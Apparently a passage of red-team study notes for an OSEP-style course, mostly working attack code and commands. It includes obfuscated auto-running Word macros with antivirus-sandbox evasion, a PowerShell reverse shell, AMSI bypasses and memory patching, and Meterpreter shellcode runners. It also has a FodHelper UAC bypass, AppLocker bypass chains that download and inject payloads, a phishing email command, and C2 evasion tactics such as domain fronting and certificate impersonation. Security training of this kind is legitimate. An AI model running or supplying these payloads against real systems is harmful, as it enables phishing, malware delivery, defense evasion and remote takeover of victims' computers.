        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
```

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function Pears(Beets)
    Pears = Chr(Beets - 23)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String
    
    Apples = "<clipboard>"
    Water = Nuts(Apples)
    GetObject(Nuts("<clipboard>")).Get(Nuts("<clipboard>")).Create Water, Tea, Coffee, Napkin
End Function
```

When most antivirus products emulate the execution of a document, they **rename** it. During execution, check the name of the document and if it is not the same as the one we originally provided => the execution has been emulated => exit the code

Generates a Meterpreter reverse shell provided that our file is named `runner.doc`

```VB
If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
    Exit Function
End If
```

## Creating Malicious Macro for OSEP

`run0.txt`

```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

$client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Invoke-Obfuscation

```pwsh
Import-Module ./Invoke-Obfuscation/
Invoke-Obfuscation
```

Invoke-Obfuscation>
```
set scriptpath run0.txt
TOKEN
ALL
1
```

Store the output in `run.txt`

### Base64 Encode Powershell Command

```pwsh
$Text = 'iex((new-object system.net.webclient).downloadstring("http://192.168.119.120/run.txt"))'                                                               

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    

$EncodedText = [Convert]::ToBase64String($Bytes)                            

$EncodedText
```

### Obfustcate VBA

```pwsh
$payload = "powershell -exec bypass -nop -w hidden -e <base64-encoded command>"
# $payload = "winmgmts:"
# $payload = "Win32_Process"
# $payload = "Report.doc"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 19
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
```

### Macro in Report0.doc

```VB
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function Pears(Beets)
    Pears = Chr(Beets - 19)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function


Function MyMacro()
    If ActiveDocument.Name <> Nuts("clipboard3") Then
        Exit Function
    End If

    Dim Apples As String
    Dim Water As String
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (3000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 3 Then
        Exit Function
    End If
    
    Apples = "clipboard"
    Water = Nuts(Apples)
    GetObject(Nuts("clipboard1")).Get(Nuts("clipboard2")).Create Water, Tea, Coffee, Napkin
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

### Stomp Microsoft Word document

```bat
.\EvilClippy.exe -s fakecode.vba Report0.doc
ren Report0_EvilClippy.doc Report.doc
```

### Send email

```bash
sendEmail -f <email>  -t <email> -u “Report to Review” -m “Please review this report” -s 192.168.119.120 -a Report.doc
```

## Bypassing AMSI With Reflection in PowerShell

```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
```

## Wrecking AMSI in PowerShell

```pwsh
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```

## FodHelper UAC Bypass

### run4.txt

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

```bash
msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;set EnableStageEncoding true;set StageEncoder encoder/x64/zutto_dekiru;run;"
```

Launch the high-integrity PowerShell prompt

```pwsh
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run4.txt') | IEX" -Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

C:\Windows\System32\fodhelper.exe
```

### Metasploit UAC bypass module

```
use exploit/windows/local/bypassuac_fodhelper
show targets
set target 1
sessions -l
set session 1
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.119.120
set lport 444
exploit
```

## Bypassing AMSI in JScript

### Registry Key

Prepend below code to the DotNetToJscript-generated shellcode runner to bypass AMSI and generate a reverse shell.

```js
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD");
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
	sh.RegWrite(key, 1, "REG_DWORD");
	WScript.Quit(1);
}
```

### Rename wscript.exe to amsi.dll and executing it

Prepend below code to the DotNetToJscript-generated shellcode runner

```js
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
	{
		throw new Error(1, '');
	}
}
catch(e)
{
	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
	WScript.Quit(1);
}
```

# Application Whitelisting

3 primary AppLocker rule categories, which can be combined as needed:

1. Based on file paths: used to whitelist a single file based on its filename and path or recursively include the contents of a directory.

2. Based on a file hash: allow a single file to execute regardless of the location. AppLocker uses a SHA256 Authenticode hash.

3. Based on a digital signature: whitelist all files from an individual publisher with a single signature, which simplifies whitelisting across version updates.

4 rule properties which enable enforcement for 4 separate file types.

1. Wxecutables: `.exe` file extension
2. Windows Installer files: "`.msi`" file extension.
3. PowerShell scripts, Jscript scripts, VB scripts and older file formats: `.cmd` and `.bat` file extensions. Does not include any 3rd-party scripting engines like Python nor compiled languages like Java.
4. Packaged Apps (also known as Universal Windows Platform (UWP) Apps)  include applications that can be installed from the Microsoft App store.

Default rules:

* Block all applications except those explicitly allowed.

* Allow all users to run executables in `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows` recursively, including executables in all subfolders. This allows basic OS functionality but prevents non-administrative users from writing in these folders due to default access rights.

* Allows members of the administrative group to run any executables they desire.

## Basic Bypasses

### Trusted Folders

Locate user-writable folders

```bat
accesschk.exe "student" C:\Windows -wus
```

```bat
icacls.exe C:\Windows\Tasks
```

### Bypass With DLLs

The default ruleset doesn't protect against loading arbitrary DLLs

```bat
rundll32 C:\Tools\TestDll.dll,run
```

`TestDll.dll`

```C
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
	MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}
```

### Alternate Data Streams

`test.js`

```js
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
```

TeamViewer version 12 uses a log file (`TeamViewer12_Logfile.log`) that is both writable and executable.

```bat
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```

Verify that the Jscript code was written to the alternate data stream

```bat
dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
```

```bat
wscript.exe "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```

### Third Party Execution

```bat
python test.py
```

## Bypassing AppLocker with PowerShell

```pwsh
$ExecutionContext.SessionState.LanguageMode

[Math]::Cos(1)
```

### Custom Runspaces

Allow arbitrary PowerShell execution

`Bypass.exe`

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";

            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```

```bat
C:\Windows\Tasks\Bypass.exe
type C:\Tools\test.txt
```

### PowerShell CLM Bypass

Command-line utility **InstallUtil** allows us to install and uninstall server resources by executing the installer components in a specified assembly.

=> Abuse it to execute arbitrary C# code by putting the code inside either the install or uninstall methods of the installer class.

Only use the **uninstall** method since the install method requires administrative privileges to execute.

The `System.Configuration.Install` namespace is missing an assembly reference in Visual Studio.

=> Add this by right-clicking on **References** in the Solution Explorer and choosing **Add References**.... > **Assemblies** menu on the left-hand side and scroll down to **System.Configuration.Install**.

AppLocker DLL rules are enabled to block untrusted DLLs

=> Leverage InstallUtil to bypass AppLocker and revive the powerful reflective DLL injection technique.

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;


namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {            
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {            
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            //String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";

            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.45.183/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";

            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```

```bat
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
```

It would be possible to reuse this tradecraft with the Microsoft Word macros since they are not limited by AppLocker.

Instead of using WMI to directly start a PowerShell process and download the shellcode runner from our web server, we could **make WMI execute InstallUtil** and obtain the same result despite AppLocker.

The issue is that **the compiled C# file has to be on disk when InstallUtil is invoked**.

To attempt to bypass anitvirus, obfuscate the executable while it is being downloaded with Base64 encoding and then decode it on disk.

Use the native **certutil** tool to perform the encoding and decoding and **bitsadmin** for the downloading.

```bat
certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt

bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt

certutil -decode enc.txt Bypass.exe
```

```bat
C:\Users\student>bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```

## Bypassing AppLocker with C#

### Microsoft.Workflow.Compiler

`test.txt`

```csharp
using System;
using System.Workflow.ComponentModel;
public class Run : Activity{
    public Run() {
        Console.WriteLine("I executed!");
    }
}
```

Create the correctly-serialized XML format in a file named `run.xml`

```pwsh
$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'

$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$compilerparam.GenerateInMemory = $True
$pathvar = "test.txt"
$output = "C:\Tools\run.xml"
$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
Move-Item $tmp $output

$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“student”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
```

`results.xml` is an arbitrary file to store the result

```bat
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
```

Downside: Must provide both the XML file and the C# code file on disk, and the C# code file will be compiled temporarily to disk as well.

### MSbuild

`https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127.001/T1127.001.md`

Executes the code in a project file using `msbuild.exe`.

`T1127.001.csproj`

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildBypass.csproj -->
  <!-- Feel free to use a more aggressive class for testing. -->
  <Target Name="Hello">
   <FragmentExample />
   <ClassExample />
  </Target>
  <UsingTask
    TaskName="FragmentExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
      <Using Namespace="System" />
      <Code Type="Fragment" Language="cs">
        <![CDATA[
			    Console.WriteLine("Hello From a Code Fragment");
        ]]>
      </Code>
    </Task>
	</UsingTask>
	<UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	<Task>
	<!-- <Reference Include="System.IO" /> Example Include -->
      <Code Type="Class" Language="cs">
        <![CDATA[
			using System;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;
			public class ClassExample :  Task, ITask
			{
				public override bool Execute()
				{
					Console.WriteLine("Hello From a Class.");
					return true;
				}
			}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

The C# project file above will simply print "Hello From a Code Fragment" and "Hello From a Class." to the screen.

```bat
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.001.csproj
```

## Bypassing AppLocker with JScript

HTML Applications include embedded Jscript or VBS code that is parsed and executed by `mshta.exe`.

Since mshta.exe is located in `C:\Windows\System32` and is a signed Microsoft application, it is commonly whitelisted.

### JScript and MSHTA

`mshta http://192.168.119.120/test.hta`

```xhtml
<html> 
<head> 
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```

Shortcut target

`C:\Windows\System32\mshta.exe http://192.168.119.120/test.hta`

### XSL Transform

`test.xsl`

```xsl
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
			var r = new ActiveXObject("WScript.Shell");
			r.Run("cmd.exe");
		]]>
	</ms:script>
</stylesheet>
```

```bat
wmic process get brief /format:"http://192.168.119.120/test.xsl"
```

# Bypassing Network Filters

## DNS Filters

`www.internetbadguys.com`

[IPVoid](https://www.ipvoid.com/dns-reputation/)

[VirusTotal](https://www.virustotal.com/gui/home/search)

[OpenDNS](https://community.opendns.com/domaintagging/search/)

Switch to an OpenDNS server

```bash
sudo bash -c "echo nameserver 208.67.222.222 > /etc/resolv.conf"
```

Register a new domain: It may be categorized as a **Newly Seen Domain** => detrimental to the reputation score, since malware authors often use brand new domains.

Domains in this category are often **less than 1 week old** and are relatively unused, lacking inquiries and traffic.

=> Collect domain names in advance and generate lookups and traffic well in advance of an engagement.

Make sure its **domain category** matches what the client allows. E.g., the "webmail" classification is often disallowed given the increased risk of downloaded malware.

Pre-populate a web site on our domain with seemingly harmless content (like a cooking blog) to earn a harmless category classification.

Subscribe to **domain categorization services** (like OpenDNS) to submit our own domain classifications. Even if our domain has been categorized as malicious, we can easily host a legitimate-looking website on the domain and request re-categorization.

Submit the domain for a community review if voting is not available or if we would like to suggest a different category.
 
Make the domain name itself appear legitimate: **typo-squatting**

Be aware of the status of the **IP address** of our C2 server. If the IP has been flagged as malicious, some defensive solutions may block the traffic. This is especially common on **shared hosting sites** in which one IP address hosts multiple websites. If one site on the shared host ever contained a browser exploit or was ever used in a watering hole malware campaign, the shared host may be flagged. Subsequently, every host that shares that IP may be flagged as well.

Use a variety of lookup tools, like Virustotal and IPVoid sites to check the status of our C2 IP address before an engagement.

Have several domains prepared in advance so we can swap them out as needed.

## Web Proxies

[Symantec Corporation](https://sitereview.bluecoat.com/)

When our payload tries to connect back to the C2 server, it must detect and implement local proxy settings, instead of trying to connect to the given domain directly.

=> Meterpreter's HTTP/S payload is proxy-aware (thanks to the InternetSetOptionA API).

Ensure that the domain and URL are clean and that our C2 server is safely **categorized** as defined by our client's policy rules.

If our C2 server domain is uncategorized, follow the prompts to categorize it according to the company's allowed use policy, since an unnamed domain will likely be flagged.

Grab a seemingly-safe domain by hosting our C2 in a **cloud service or Content Delivery Network (CDN)**, which auto-assigns a generic domain. E.g., `cloudfront.net`, `wordpress.com`, or `azurewebsites.net`. These types of domains are often auto-allowed since they are used by legitimate websites and hosting services.

Consider the traces our C2 session will leave in the proxy logs. Instead of simply generating custom TCP traffic on ports 80 or 443, our session should **conform to HTTP protocol standards**.

=> Many framework payloads, including Metasploit's Meterpreter, follow the standards as they use HTTP APIs like HttpOpenRequestA.

Set our **User-Agent** to a browser type that is permitted by the organization. E.g., Microsoft Windows with Edge. A User-Agent for Chrome running on macOS will likely raise suspicion or might be blocked.

To determine an allowed User-Agent string, consider social engineering or sniff HTTP packets from our internal point of presence.

Use a site like `useragentstring.com` to build the string or choose from a variety of user-supplied strings.

Set our custom User-Agent in Meterpreter with the **HttpUserAgent** advanced configuration option.

## IDS and IPS Sensors

### Bypassing Norton HIPS with Custom Certificates

Norton HIPS detects the standard Meterpreter HTTPS certificate.

Potential reasons:

- It's a self-signed certificate => use a real SSL certificate, which requires that we own that domain => Obtain a signed, valid certificate, perhaps from a service provider like **Let's Encrypt**.

- Self-signed certificates are somewhat common for non-malicious use though => Norton contains signatures for the data present in Meterpreter's randomized certificates. 

Create our own self-signed certificate, customize some of its fields (If the certificate is passing through HTTPS inspection, the traffic might flag because of an untrusted certificate.)

* Generate a self-signed certificate whose metadata matches the site we are trying to impersonate with Metasploit's **impersonate_ssl** auxiliary module.

* Manually create a self-signed certificate with `openssl`, which allows us full control over the certificate details.

```bash
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
cat priv.key cert.crt > nasa.pem
```

* req: Create a self-signed certificate.
* -new: Generate a new certificate.
* -x509: Output a self-signed certificate instead of a certificate request.
* -nodes: Do not encrypt private keys.
* -out cert.crt: Output file for the certificate.
* -keyout priv.key: Output file for the private key.

Change the CipherString in the `/etc/ssl/openssl.cnf` config file or our reverse HTTPS shell will not work properly:

- Remove the "@SECLEVEL=2" string, as the SECLEVEL option limits the usable hash and cypher functions in an SSL or TLS connection, i.e. set this to "DEFAULT", which allows all.

`CipherString=DEFAULT@SECLEVEL=2` > `CipherString=DEFAULT`

```
use exploit/multi/handler
set HandlerSSLCert /home/kali/self_cert/nasa.pem
exploit
```

[impersonate_ssl](https://www.hackingarticles.in/bypass-detection-for-meterpreter-shell-impersonate_ssl/)

Generate the certificate

```
use auxiliary/gather/impersonate_ssl
set RHOST www.nasa.gov
exploit
```

## Full Packet Capture Devices

Full packet capture devices typically sit on a network tap, which will capture the traffic. And are typically used during post-incident forensic investigations.

RSA's Netwitness is a common enterprise-level full packet capture system and Moloch is an alternative free open source alternative.

## HTTPS Inspection

If we are using HTTPS, simply assume that our traffic will be inspected and try to keep a low profile.

=> Abort a payload if we suspect that it is being inspected. 

Using **TLS Certificate Pinning** in Meterpreter, specify the certificate that will be trusted. Meterpreter will then compare the hash of the certificates and if there is a mismatch, it will terminate itself. This can be controlled by setting the **StagerVerifySSLCert** option to "true" and configuring **HandlerSSLCert** with the certificate we trust and want to use.

Try to **categorize** the target domain of our traffic to reduce the likelihood of inspection. Some categories, like "banking", are usually not subject to inspection because of privacy concerns.

## Domain Fronting

Large Content Delivery Networks (CDN) can be difficult to block or filter on a granular basis.

Domain fronting allows us to fetch arbitrary website content from a CDN, even though the initial TLS session is targeting a different domain. This is possible as the TLS and the HTTP session are handled independently.

E.g., Initiate the TLS session to `www.example1.com` and then get the contents of `www.example2.com`.

With **virtual hosting**, multiple web sites associated with different domains could be hosted on a single machine, i.e. from a single IP address. The key to this functionality is the **request HOST header**, which specifies the **target domain name**, and optionally the port on which the web server is listening for the specified domain.
 
On the hosting server itself, the **Host** header maps to a value in one of the web server's configuration files.

E.g., NGINX configuration shown below

```
server {
        listen 80;
        listen [::]:80;

        root /var/www/example.com/html;
        index index.html index.htm index.nginx-debian.html;

        server_name example.com www.example.com;

        location / {
                try_files $uri $uri/ =404;
        }
}
```

**server_name** lists the available domain names this particular configuration applies to.

**root** field specifies what content is served for that domain name.
=> A server can host many websites from a single host through multiple domain-centric configuration files.

When a client connects to a server that runs TLS, the server must also determine which certificate to send in the response based on the client's request.

Since the HTTP Host header is only available after the secure channel has been established, it can't be used to specify the target domain. Instead, the TLS **Server Name Indication** (SNI) field, which can be set in the "TLS Client Hello" packet during the TLS negotiation process, is used to specify the target domain and therefore the certificate that is sent in response.
 
=> If `www.example2.com` is a blocked domain, but `www.example1.com` is not, make an HTTPS connection to a server and set the SNI to indicate that we are accessing `www.example1.com`. Once the TLS session is established and we start the HTTP session (over TLS), we can specify a different domain name in the Host header, for example `www.example2.com`. This will cause the webserver to serve content for that website instead. If our target is not performing HTTPS inspection, it will only see the initial connection to `www.example1.com`, unaware that we were connecting to `www.example2.com`.

On a larger scale, a CDN provides geographically-optimized web content delivery. CDN endpoints cache and serve the actual website content from multiple sources, and the HTTP request Host header is used to differentiate this content. It can serve us any resource (typically a website) that is being hosted on the same CDN network.

E.g., `www.example.com` will point to the CDN endpoint's domain name (e.g.: `something.azureedge.net`) through DNS Canonical Name (CNAME) records. When a client looks up `www.example.com`, the DNS will recursively lookup `something.azureedge.net`, which will be resolved by Azure. 

=> Traffic will be directed to the CDN endpoint rather than the real server. Since CDN endpoints are used to serve content from multiple websites, the returned content is based on the Host header.

